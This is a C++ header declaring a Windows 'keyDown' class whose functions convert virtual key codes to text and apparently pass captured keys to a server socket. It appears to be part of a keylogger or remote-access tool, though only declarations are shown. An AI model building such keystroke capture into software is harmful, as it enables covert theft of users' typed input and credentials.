#pragma once

#include <iostream>
#include <windows.h>
#include "../server/server.h"

using namespace std;

class keyDown {
public:
    static string VirtualKeyCodeToString(UCHAR virtualKey);
    static void catchCodeAlltoString(Server* S, int id_AcSocket);
};
